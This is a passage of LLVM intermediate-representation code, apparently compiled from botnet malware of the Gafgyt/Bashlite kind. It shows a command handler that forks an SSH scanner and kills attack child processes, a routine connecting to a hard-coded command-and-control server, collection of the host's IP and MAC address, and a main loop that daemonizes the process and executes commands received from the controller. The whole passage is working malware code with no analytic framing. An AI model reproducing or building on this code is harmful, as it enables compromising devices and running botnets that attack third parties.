; <label>:48:                                     ; preds = %33
  %49 = tail call i32 @strcmp(i8* %38, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.68, i64 0, i64 0)) #14
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %51, label %._crit_edge112

._crit_edge112:                                   ; preds = %48
  %.pre = load i8*, i8** %1, align 8
  br label %58

; <label>:51:                                     ; preds = %48
  %52 = tail call i32 @fork() #3
  %53 = load i32, i32* @mainCommSock, align 4
  %54 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %53, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i64 0, i64 0))
  %55 = icmp eq i32 %52, 0
  br i1 %55, label %57, label %56

; <label>:56:                                     ; preds = %51
  store i32 %52, i32* @scanPid, align 4
  br label %103

; <label>:57:                                     ; preds = %51
  tail call void @secureShellScan() #3
  unreachable

; <label>:58:                                     ; preds = %._crit_edge112, %25
  %59 = phi i8* [ %.pre, %._crit_edge112 ], [ %3, %25 ]
  %60 = tail call i32 @strcmp(i8* %59, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i64 0, i64 0)) #14
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %103, label %62

; <label>:62:                                     ; preds = %58
  %63 = tail call i32 @strcmp(i8* %59, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.70, i64 0, i64 0)) #14
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %103, label %65

; <label>:65:                                     ; preds = %62
  %66 = tail call i32 @strcmp(i8* %59, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #14
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %103, label %68

; <label>:68:                                     ; preds = %65
  %69 = tail call i32 @strcmp(i8* %59, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i64 0, i64 0)) #14
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %.preheader, label %98

.preheader:                                       ; preds = %68
  %71 = load i64, i64* @numpids, align 8
  %72 = icmp eq i64 %71, 0
  br i1 %72, label %._crit_edge.thread, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

._crit_edge.thread:                               ; preds = %.preheader
  %73 = load i32, i32* @mainCommSock, align 4
  br label %95

.lr.ph:                                           ; preds = %.lr.ph.preheader, %87
  %.0111 = phi i64 [ %88, %87 ], [ 0, %.lr.ph.preheader ]
  %.0100110 = phi i32 [ %.1, %87 ], [ 0, %.lr.ph.preheader ]
  %74 = load i32*, i32** @pids, align 8
  %75 = getelementptr inbounds i32, i32* %74, i64 %.0111
  %76 = load i32, i32* %75, align 4
  %77 = icmp eq i32 %76, 0
  br i1 %77, label %87, label %78

; <label>:78:                                     ; preds = %.lr.ph
  %79 = tail call i32 @getpid() #3
  %80 = icmp eq i32 %76, %79
  br i1 %80, label %87, label %81

; <label>:81:                                     ; preds = %78
  %82 = load i32*, i32** @pids, align 8
  %83 = getelementptr inbounds i32, i32* %82, i64 %.0111
  %84 = load i32, i32* %83, align 4
  %85 = tail call i32 @kill(i32 %84, i32 9) #3
  %86 = add nsw i32 %.0100110, 1
  br label %87

; <label>:87:                                     ; preds = %78, %.lr.ph, %81
  %.1 = phi i32 [ %86, %81 ], [ %.0100110, %78 ], [ %.0100110, %.lr.ph ]
  %88 = add i64 %.0111, 1
  %89 = load i64, i64* @numpids, align 8
  %90 = icmp ult i64 %88, %89
  br i1 %90, label %.lr.ph, label %._crit_edge

._crit_edge:                                      ; preds = %87
  %91 = icmp sgt i32 %.1, 0
  %92 = load i32, i32* @mainCommSock, align 4
  br i1 %91, label %93, label %95

; <label>:93:                                     ; preds = %._crit_edge
  %94 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %92, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.73, i64 0, i64 0), i32 %.1)
  br label %98

; <label>:95:                                     ; preds = %._crit_edge.thread, %._crit_edge
  %96 = phi i32 [ %73, %._crit_edge.thread ], [ %92, %._crit_edge ]
  %97 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %96, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.74, i64 0, i64 0))
  br label %98

; <label>:98:                                     ; preds = %68, %93, %95
  %99 = load i8*, i8** %1, align 8
  %100 = tail call i32 @strcmp(i8* %99, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.75, i64 0, i64 0)) #14
  %101 = icmp eq i32 %100, 0
  br i1 %101, label %102, label %103

; <label>:102:                                    ; preds = %98
  tail call void @exit(i32 0) #16
  unreachable

; <label>:103:                                    ; preds = %65, %62, %58, %98, %17, %30, %56, %46, %22, %12, %6
  ret void
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [512 x i8], align 16
  %2 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 512, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #3
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #3
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #14
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #14
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 46, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.76, i64 0, i64 0)) #3
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #17
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #3
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #3
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.77, i64 0, i64 0), i32 0) #3
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i64 0, i64 0)) #14
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #3
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #3
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #3
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #3
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #5

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture readnone) local_unnamed_addr #12 {
  %3 = alloca [50 x i8], align 16
  %4 = alloca i32, align 4
  %5 = alloca [11 x i8], align 1
  %6 = alloca i32, align 4
  %7 = alloca [4096 x i8], align 16
  %8 = alloca [10 x i8*], align 16
  %9 = getelementptr inbounds [50 x i8], [50 x i8]* %3, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %9, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @main.ismokeweed, i64 0, i64 0), i64 50, i32 16, i1 false)
  %10 = getelementptr inbounds [11 x i8], [11 x i8]* %5, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %10, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @main.r00t3d, i64 0, i64 0), i64 11, i32 1, i1 false)
  %11 = call %struct._IO_FILE* @fopen(i8* nonnull %9, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.79, i64 0, i64 0))
  %12 = call i64 @fwrite(i8* nonnull %10, i64 1, i64 11, %struct._IO_FILE* %11)
  %13 = tail call i32 @fileno(%struct._IO_FILE* %11) #3
  %14 = tail call i32 (i32, i32, ...) bitcast (i32 (...)* @fchmod to i32 (i32, i32, ...)*)(i32 %13, i32 3071) #3
  %15 = tail call i32 @fileno(%struct._IO_FILE* %11) #3
  %16 = call i32 (i32, i64, ...) @ioctl(i32 %15, i64 0, i32* nonnull %4) #3
  %17 = call i32 @fclose(%struct._IO_FILE* %11)
  %18 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %19 = call i32 @getpid() #3
  %20 = xor i32 %19, %18
  call void @srand(i32 %20) #3
  %21 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %22 = call i32 @getpid() #3
  %23 = xor i32 %22, %21
  call void @init_rand(i32 %23)
  %24 = call i32 @getOurIP()
  %25 = call i32 @fork() #3
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %29, label %27

; <label>:27:                                     ; preds = %2
  %28 = call i32 @waitpid(i32 %25, i32* nonnull %6, i32 0) #3
  call void @exit(i32 0) #16
  unreachable

; <label>:29:                                     ; preds = %2
  %30 = call i32 @fork() #3
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %33, label %32

; <label>:32:                                     ; preds = %29
  call void @exit(i32 0) #16
  unreachable

; <label>:33:                                     ; preds = %29
  %34 = call i32 @setsid() #3
  %35 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i64 0, i64 0)) #3
  %36 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  %37 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %38 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 1
  %39 = getelementptr inbounds [10 x i8*], [10 x i8*]* %8, i64 0, i64 0
  br label %.backedge83

.backedge83.loopexit:                             ; preds = %.backedge
  br label %.backedge83.backedge

.backedge83:                                      ; preds = %.backedge83.backedge, %33
  %40 = call i32 @initConnection()
  %41 = icmp eq i32 %40, 0
  br i1 %41, label %.preheader81, label %45

.preheader81:                                     ; preds = %.backedge83
  %42 = load i32, i32* @mainCommSock, align 4
  %43 = call i32 @recvLine(i32 %42, i8* nonnull %37, i32 4096)
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %.backedge83.backedge, label %.preheader80.preheader

.backedge83.backedge:                             ; preds = %.preheader81, %45, %.backedge83.loopexit
  br label %.backedge83

.preheader80.preheader:                           ; preds = %.preheader81
  br label %.preheader80

; <label>:45:                                     ; preds = %.backedge83
  %46 = call i32 @sleep(i32 5) #3
  br label %.backedge83.backedge

.preheader80:                                     ; preds = %.preheader80.preheader, %.backedge
  %47 = phi i32 [ %97, %.backedge ], [ %43, %.preheader80.preheader ]
  %48 = load i64, i64* @numpids, align 8
  %49 = icmp eq i64 %48, 0
  br i1 %49, label %._crit_edge97, label %.lr.ph96.preheader

.lr.ph96.preheader:                               ; preds = %.preheader80
  br label %.lr.ph96

.lr.ph96:                                         ; preds = %.lr.ph96.preheader, %.lr.ph96._crit_edge
  %indvars.iv = phi i64 [ %55, %.lr.ph96._crit_edge ], [ 0, %.lr.ph96.preheader ]
  %50 = load i32*, i32** @pids, align 8
  %51 = getelementptr inbounds i32, i32* %50, i64 %indvars.iv
  %52 = load i32, i32* %51, align 4
  %53 = call i32 @waitpid(i32 %52, i32* null, i32 1) #3
  %54 = icmp sgt i32 %53, 0
  %55 = add nuw i64 %indvars.iv, 1
  br i1 %54, label %.preheader, label %.lr.ph96._crit_edge

.preheader:                                       ; preds = %.lr.ph96
  %56 = load i64, i64* @numpids, align 8
  %57 = icmp ult i64 %55, %56
  %58 = load i32*, i32** @pids, align 8
  %59 = trunc i64 %indvars.iv to i32
  br i1 %57, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %60 = trunc i64 %55 to i32
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %61 = phi i32* [ %70, %.lr.ph ], [ %58, %.lr.ph.preheader ]
  %62 = phi i64 [ %67, %.lr.ph ], [ %55, %.lr.ph.preheader ]
  %.06888 = phi i32 [ %.068, %.lr.ph ], [ %60, %.lr.ph.preheader ]
  %.068.in87 = phi i32 [ %.06888, %.lr.ph ], [ %59, %.lr.ph.preheader ]
  %63 = getelementptr inbounds i32, i32* %61, i64 %62
  %64 = load i32, i32* %63, align 4
  %65 = zext i32 %.068.in87 to i64
  %66 = getelementptr inbounds i32, i32* %61, i64 %65
  store i32 %64, i32* %66, align 4
  %.068 = add i32 %.06888, 1
  %67 = zext i32 %.068 to i64
  %68 = load i64, i64* @numpids, align 8
  %69 = icmp ult i64 %67, %68
  %70 = load i32*, i32** @pids, align 8
  br i1 %69, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.068.in.lcssa = phi i32 [ %59, %.preheader ], [ %.06888, %._crit_edge.loopexit ]
  %.lcssa = phi i32* [ %58, %.preheader ], [ %70, %._crit_edge.loopexit ]
  %71 = zext i32 %.068.in.lcssa to i64
  %72 = getelementptr inbounds i32, i32* %.lcssa, i64 %71
  store i32 0, i32* %72, align 4
  %73 = load i64, i64* @numpids, align 8
  %74 = add i64 %73, -1
  store i64 %74, i64* @numpids, align 8
  %75 = shl i64 %73, 2
  %76 = call noalias i8* @malloc(i64 %75) #3
  %77 = bitcast i8* %76 to i32*
  %78 = icmp eq i64 %74, 0
  %79 = load i32*, i32** @pids, align 8
  br i1 %78, label %._crit_edge93, label %.lr.ph92.preheader

.lr.ph92.preheader:                               ; preds = %._crit_edge
  br label %.lr.ph92

.lr.ph92:                                         ; preds = %.lr.ph92.preheader, %.lr.ph92
  %80 = phi i64 [ %85, %.lr.ph92 ], [ 0, %.lr.ph92.preheader ]
  %.16990 = phi i32 [ %84, %.lr.ph92 ], [ 0, %.lr.ph92.preheader ]
  %81 = getelementptr inbounds i32, i32* %79, i64 %80
  %82 = load i32, i32* %81, align 4
  %83 = getelementptr inbounds i32, i32* %77, i64 %80
  store i32 %82, i32* %83, align 4
  %84 = add i32 %.16990, 1
  %85 = zext i32 %84 to i64
  %86 = icmp ult i64 %85, %74
  br i1 %86, label %.lr.ph92, label %._crit_edge93.loopexit

._crit_edge93.loopexit:                           ; preds = %.lr.ph92
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %._crit_edge93.loopexit, %._crit_edge
  %87 = bitcast i32* %79 to i8*
  call void @free(i8* %87) #3
  store i8* %76, i8** bitcast (i32** @pids to i8**), align 8
  br label %.lr.ph96._crit_edge

.lr.ph96._crit_edge:                              ; preds = %.lr.ph96, %._crit_edge93
  %sext = shl i64 %55, 32
  %88 = ashr exact i64 %sext, 32
  %89 = load i64, i64* @numpids, align 8
  %90 = icmp ult i64 %88, %89
  br i1 %90, label %.lr.ph96, label %._crit_edge97.loopexit

._crit_edge97.loopexit:                           ; preds = %.lr.ph96._crit_edge
  br label %._crit_edge97

._crit_edge97:                                    ; preds = %._crit_edge97.loopexit, %.preheader80
  %91 = sext i32 %47 to i64
  %92 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 %91
  store i8 0, i8* %92, align 1
  call void @trim(i8* nonnull %37)
  %strncmp = call i32 @strncmp(i8* nonnull %37, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.58, i64 0, i64 0), i64 13)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %93, label %99

; <label>:93:                                     ; preds = %._crit_edge97
  %94 = load i32, i32* @mainCommSock, align 4
  %95 = call i32 (i32, i8*, ...) @sockprintf(i32 %94, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.82, i64 0, i64 0))
  br label %.backedge

.backedge.loopexit:                               ; preds = %.lr.ph109
  br label %.backedge

.backedge.loopexit124:                            ; preds = %.preheader110
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit124, %.backedge.loopexit, %._crit_edge106.thread, %93, %._crit_edge106, %101
  %96 = load i32, i32* @mainCommSock, align 4
  %97 = call i32 @recvLine(i32 %96, i8* nonnull %37, i32 4096)
  %98 = icmp eq i32 %97, -1
  br i1 %98, label %.backedge83.loopexit, label %.preheader80

; <label>:99:                                     ; preds = %._crit_edge97
  %strncmp72 = call i32 @strncmp(i8* nonnull %37, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.83, i64 0, i64 0), i64 13)
  %cmp73 = icmp eq i32 %strncmp72, 0
  br i1 %cmp73, label %100, label %101

; <label>:100:                                    ; preds = %99
  call void @exit(i32 0) #16
  unreachable

; <label>:101:                                    ; preds = %99
  %102 = load i8, i8* %37, align 16
  %103 = icmp eq i8 %102, 33
  br i1 %103, label %.preheader110.preheader, label %.backedge

.preheader110.preheader:                          ; preds = %101
  br label %.preheader110

.preheader110:                                    ; preds = %.preheader110.preheader, %105
  %.066 = phi i8* [ %106, %105 ], [ %38, %.preheader110.preheader ]
  %104 = load i8, i8* %.066, align 1
  switch i8 %104, label %105 [
    i8 0, label %.backedge.loopexit124
    i8 32, label %107
  ]

; <label>:105:                                    ; preds = %.preheader110
  %106 = getelementptr inbounds i8, i8* %.066, i64 1
  br label %.preheader110

; <label>:107:                                    ; preds = %.preheader110
  store i8 0, i8* %.066, align 1
  %108 = call i64 @strlen(i8* %38) #14
  %109 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 %108
  %110 = getelementptr inbounds i8, i8* %109, i64 2
  br label %111

; <label>:111:                                    ; preds = %116, %107
  %112 = call i64 @strlen(i8* %110) #14
  %113 = add i64 %112, -1
  %114 = getelementptr inbounds i8, i8* %110, i64 %113
  %115 = load i8, i8* %114, align 1
  switch i8 %115, label %.preheader78.preheader [
    i8 13, label %116
    i8 10, label %116
  ]

.preheader78.preheader:                           ; preds = %111
  br label %.preheader78

; <label>:116:                                    ; preds = %111, %111
  store i8 0, i8* %114, align 1
  br label %111

.preheader78:                                     ; preds = %.preheader78.preheader, %118
  %.067 = phi i8* [ %119, %118 ], [ %110, %.preheader78.preheader ]
  %117 = load i8, i8* %.067, align 1
  switch i8 %117, label %118 [
    i8 32, label %120
    i8 0, label %120
  ]

; <label>:118:                                    ; preds = %.preheader78
  %119 = getelementptr inbounds i8, i8* %.067, i64 1
  br label %.preheader78

; <label>:120:                                    ; preds = %.preheader78, %.preheader78
  store i8 0, i8* %.067, align 1
  %121 = getelementptr inbounds i8, i8* %.067, i64 1
  %122 = load i8, i8* %110, align 1
  %123 = icmp eq i8 %122, 0
  br i1 %123, label %._crit_edge101, label %.lr.ph100.preheader

.lr.ph100.preheader:                              ; preds = %120
  br label %.lr.ph100

.lr.ph100:                                        ; preds = %.lr.ph100.preheader, %.lr.ph100
  %124 = phi i8 [ %129, %.lr.ph100 ], [ %122, %.lr.ph100.preheader ]
  %.06598 = phi i8* [ %128, %.lr.ph100 ], [ %110, %.lr.ph100.preheader ]
  %125 = zext i8 %124 to i32
  %126 = call i32 @toupper(i32 %125) #14
  %127 = trunc i32 %126 to i8
  store i8 %127, i8* %.06598, align 1
  %128 = getelementptr inbounds i8, i8* %.06598, i64 1
  %129 = load i8, i8* %128, align 1
  %130 = icmp eq i8 %129, 0
  br i1 %130, label %._crit_edge101.loopexit, label %.lr.ph100

._crit_edge101.loopexit:                          ; preds = %.lr.ph100
  br label %._crit_edge101

._crit_edge101:                                   ; preds = %._crit_edge101.loopexit, %120
  %131 = call i8* @strtok(i8* %121, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  store i8* %110, i8** %39, align 16
  %132 = icmp eq i8* %131, null
  br i1 %132, label %._crit_edge106.thread, label %.lr.ph105.preheader

.lr.ph105.preheader:                              ; preds = %._crit_edge101
  br label %.lr.ph105

._crit_edge106.thread:                            ; preds = %._crit_edge101
  call void @processCmd(i32 1, i8** nonnull %39)
  br label %.backedge

.lr.ph105:                                        ; preds = %.lr.ph105.preheader, %145
  %.063103 = phi i8* [ %146, %145 ], [ %131, %.lr.ph105.preheader ]
  %.064102 = phi i32 [ %.1, %145 ], [ 1, %.lr.ph105.preheader ]
  %133 = load i8, i8* %.063103, align 1
  %134 = icmp eq i8 %133, 10
  br i1 %134, label %145, label %135

; <label>:135:                                    ; preds = %.lr.ph105
  %136 = call i64 @strlen(i8* nonnull %.063103) #14
  %137 = add i64 %136, 1
  %138 = call noalias i8* @malloc(i64 %137) #3
  %139 = sext i32 %.064102 to i64
  %140 = getelementptr inbounds [10 x i8*], [10 x i8*]* %8, i64 0, i64 %139
  store i8* %138, i8** %140, align 8
  %141 = call i64 @strlen(i8* nonnull %.063103) #14
  %142 = add i64 %141, 1
  call void @llvm.memset.p0i8.i64(i8* %138, i8 0, i64 %142, i32 1, i1 false)
  %143 = call i8* @strcpy(i8* %138, i8* nonnull %.063103) #3
  %144 = add nsw i32 %.064102, 1
  br label %145

; <label>:145:                                    ; preds = %.lr.ph105, %135
  %.1 = phi i32 [ %144, %135 ], [ %.064102, %.lr.ph105 ]
  %146 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %147 = icmp eq i8* %146, null
  br i1 %147, label %._crit_edge106, label %.lr.ph105

._crit_edge106:                                   ; preds = %145
  call void @processCmd(i32 %.1, i8** nonnull %39)
  %148 = icmp sgt i32 %.1, 1
  br i1 %148, label %.lr.ph109.preheader, label %.backedge

.lr.ph109.preheader:                              ; preds = %._crit_edge106
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph109

.lr.ph109:                                        ; preds = %.lr.ph109.preheader, %.lr.ph109
  %indvars.iv116 = phi i64 [ %indvars.iv.next117, %.lr.ph109 ], [ 1, %.lr.ph109.preheader ]
  %149 = getelementptr inbounds [10 x i8*], [10 x i8*]* %8, i64 0, i64 %indvars.iv116
  %150 = load i8*, i8** %149, align 8
  call void @free(i8* %150) #3
  %indvars.iv.next117 = add nuw nsw i64 %indvars.iv116, 1
  %exitcond = icmp eq i64 %indvars.iv.next117, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph109
}

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: nounwind
declare i64 @fwrite(i8* nocapture, i64, i64, %struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @fileno(%struct._IO_FILE* nocapture) local_unnamed_addr #5

declare i32 @fchmod(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

declare i32 @sleep(i32) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #14

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
